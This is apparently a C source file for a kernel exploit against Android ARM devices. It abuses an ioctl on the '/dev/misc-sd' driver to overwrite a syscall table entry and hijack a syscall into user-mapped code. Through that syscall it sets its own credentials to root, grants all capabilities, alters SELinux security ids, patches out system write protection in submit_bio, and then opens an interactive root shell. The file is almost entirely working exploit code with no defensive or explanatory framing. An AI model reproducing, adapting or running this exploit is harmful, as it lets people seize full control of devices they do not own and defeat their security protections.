#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/prctl.h>

#define DEV "/dev/misc-sd"
#define KERNEL_START     0xc0008000

extern unsigned long lookup_sym(const char *name);

int (*my_printk)(const char *fmt, ...);

struct msdc_ioctl{
	int  opcode;
	int  host_num;
	int  iswrite;
	int  trans_type;
	unsigned int  total_size;
	unsigned int  address;
	unsigned int* buffer;
	int  cmd_pu_driving;
	int  cmd_pd_driving;
	int  dat_pu_driving;
	int  dat_pd_driving;
	int  clk_pu_driving;
	int  clk_pd_driving;
	int  clock_freq;
        int  partition;
        int  hopping_bit;
        int  hopping_time;
	int  result;
	int sd30_mode;
	int sd30_max_current;
	int sd30_drive;
	int sd30_power_control;
};


struct kernel_cap_struct {
	unsigned long cap[2];
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};


struct task_struct_partial {
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};


int root_it()
{
        struct cred *(*my_prepare_kernel_cred)(struct task_struct *daemon);

        int (*my_commit_creds)(struct cred *new);

        my_prepare_kernel_cred = lookup_sym("prepare_kernel_cred");
        my_commit_creds = lookup_sym("commit_creds");
        if (my_prepare_kernel_cred &&
            my_commit_creds) {
                my_commit_creds(my_prepare_kernel_cred(NULL));
                return 0;
        }
        return 1;
}

int mod_wp()
{
        unsigned int *p;
        unsigned int *head, *end;
        unsigned int tmp;
        unsigned int *t;
        
        p = (unsigned int*)lookup_sym("submit_bio");
        if (!p) {
                my_printk("can not find symbol addr!\n");
                return 0;
        }
        head = p;
        
        end = p + (0x400 / sizeof(unsigned int*));
        while(p < end) {

                if ((*p & ~0xfff) == 0xe59f1000) {
                        if ((*(p + 1) & 0xff000000) == 0xeb000000) {
                                tmp = *p << 20;
                                t = (tmp >> 20) + (unsigned int)p;
                                t = *(t + 2);
                                if (*t == 0x41414141) {
                                        return 2;
                                }
                                else if (*t == 0x62636d6d) {
                                //if (*t == 0x41414141) {
                                        *t = 0x41414141;
                                        /*
                                        printk("CODE: Find TA!\n");
                                        printk("CODE: offset = %x\n", (p - head) * 4);
                                        printk("CODE: +0 0x%08x\n", *p);
                                        printk("CODE: 10 inst after\n");
                                        for (i = 1; i < 10; i++) {
                                                printk("CODE: +%d 0x%08x\n", i*4, *(p + i));
                                        }
                                        printk("CODE: str +0 0x%08x\n", *(t + 1));
                                        printk("CODE: str +4 0x%08x\n", *(t + 2));
                                        printk("CODE: str +8 0x%08x\n", *(t + 3));
                                        */
                                        return 1;
                                }
                        }
                }
                //printk("CODE: 0x%08x\n", *p);
                p++;
        }
        return 0;
}

int test()
{
        my_printk = lookup_sym("printk");
        if (my_printk) {
                //my_printk("invoke OK!\n");
                return 123;
        }
        return 0;
}

int root_by_set_cred(void)
{
        unsigned long s;
        unsigned long *taskbuf;
        struct task_struct_partial *task;
        struct cred *cred;
        struct cred credbuf;
        struct task_security_struct *security;
	struct task_security_struct securitybuf;
        int i;
        
        __asm__ ("mov %0,sp"
              :"=r"(s)
                );
        
        s &= ~0x1fff;

        taskbuf = *(unsigned long*)(s + 0xc);

        for (i = 0; i < 0x100; i++) {
                task = taskbuf + i;
                if (task->cpu_timers[0].next == task->cpu_timers[0].prev
                    && (unsigned long)task->cpu_timers[0].next > KERNEL_START
                    && task->cpu_timers[1].next == task->cpu_timers[1].prev
                    && (unsigned long)task->cpu_timers[1].next > KERNEL_START
                    && task->cpu_timers[2].next == task->cpu_timers[2].prev
                    && (unsigned long)task->cpu_timers[2].next > KERNEL_START
                    && task->real_cred == task->cred) {
                        cred = task->cred;
                        break;
                }
        }

        security = cred->security;
        if ((unsigned long)security > KERNEL_START
            && (unsigned long)security < 0xffff0000) {
                if (security->osid != 0
                    && security->sid != 0
                    && security->exec_sid == 0
                    && security->create_sid == 0
                    && security->keycreate_sid == 0
                    && security->sockcreate_sid == 0) {
                        security->osid = 1;
                        security->sid = 1;

                }
        }

        cred->uid = 0;
        cred->gid = 0;
        cred->suid = 0;
        cred->sgid = 0;
        cred->euid = 0;
        cred->egid = 0;
        cred->fsuid = 0;
        cred->fsgid = 0;

        cred->cap_inheritable.cap[0] = 0xffffffff;
        cred->cap_inheritable.cap[1] = 0xffffffff;
        cred->cap_permitted.cap[0] = 0xffffffff;
        cred->cap_permitted.cap[1] = 0xffffffff;
        cred->cap_effective.cap[0] = 0xffffffff;
        cred->cap_effective.cap[1] = 0xffffffff;
        cred->cap_bset.cap[0] = 0xffffffff;
        cred->cap_bset.cap[1] = 0xffffffff;
        
        return 0;
}

unsigned long find_syscall_table()
{
        int ret;
        unsigned long addr;

        addr = 0xffff0008 + 8 + (*(unsigned long*)0xffff0008 & 0xfff);
        addr = *(unsigned long*)addr;

        ret = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
        if (ret > 0)
                addr += 0x18;
        /* ret = syscall(__NR_semop, , 0, 0); */
        /* printf("ret = %d\n", ret); */
        /* if (ret == -1) */
        /*         perror("semop:"); */

        /* vector_swi +  __sys_trace + __sys_trace_return + __cr_agignment */
        addr += 0x74 + 0x2c + 0x20 + 0x4;

        return addr;
}

void set_call_back(int fd, unsigned target, unsigned addr)
{

        unsigned *t;
        unsigned char *base;
        struct msdc_ioctl mi;
        unsigned long syscall_table;

        t = (unsigned int *)target;

        memset(&mi,0, sizeof mi);
        mi.opcode = 0;
        mi.host_num = 0x24000000;
        mi.iswrite = 1;

        /* sys_call_table sys_pciconfig_iobase*/
        syscall_table = find_syscall_table();
        //printf("find sys_call_table: %p\n", find_syscall_table());

        base = syscall_table + sizeof(unsigned long*) * __NR_pciconfig_iobase;
        *t = base;
        mi.cmd_pu_driving = (addr >> 8) & 0xff;
        mi.dat_pu_driving = (addr >> 16) & 0xff;
        mi.clk_pu_driving = addr & 0xff;
        ioctl(fd, 0, &mi);

        *t = (unsigned)base + 3;
        mi.cmd_pu_driving = addr & 0xff;
        mi.dat_pu_driving = (addr >> 8) & 0xff;
        mi.clk_pu_driving = (addr >> 24) & 0xff;
        ioctl(fd, 0, &mi);

        /*
        *t = (unsigned)base + 6;
        mi.cmd_pu_driving = (addr >> 24) & 0xff;
        mi.dat_pu_driving = addr & 0xff;
        mi.clk_pu_driving = (addr >> 16) & 0xff;
        ioctl(fd, 0, &mi);
        */

}

int main()
{
        int fd;
        int ret;
        unsigned int *p;
        unsigned int i;

        fd = open(DEV, O_RDONLY);
        if (fd < 0) {
                printf("can not open device: %s\n", DEV);
                return -1;
        }

        p = mmap((void*)0x50000000, 0x3000000, PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
        
        if (p != 0x50000000) {
                printf("mmap failed !\n");
                return -1;
        }
        
        for (i = 0;i < 0x1fffffc/4; i++) {
                p[i] = 0x52000000; 
        }

        set_call_back(fd, 0x52000000, (unsigned)test);
        
        ret = syscall(0x110, 0, 0 , 0, 0);
        if (ret != 123) {
                printf("quit this method!\n");
                goto out;
        }
        //set_call_back(fd, 0x52000000, (unsigned)root_it);
        set_call_back(fd, 0x52000000, (unsigned)root_by_set_cred);
        ret = syscall(0x110, 0, 0, 0, 0);
        if (ret == 1) {
                printf("commit: root failed!\n");
                goto out;
        }
        else {
                if (geteuid() == 0) {
                        printf("root success!\n");
                }
                else {
                        printf("root failed!\n");
                        goto out;
                }
        }

        set_call_back(fd, 0x52000000, (unsigned)mod_wp);

        ret = syscall(0x110, 0, 0, 0, 0);
        if (ret == 2) {
                printf("system write protection already removed!\n");
        }
        else if (ret == 1) {
                printf("remove system write protection success!\n");
        }
        else {
                printf("remove system write protection failed!\n");
        }


        system("/system/bin/sh -i");
out:
        close(fd);
        munmap((void*)0x50000000, 0x3000000);
        return 0;
}
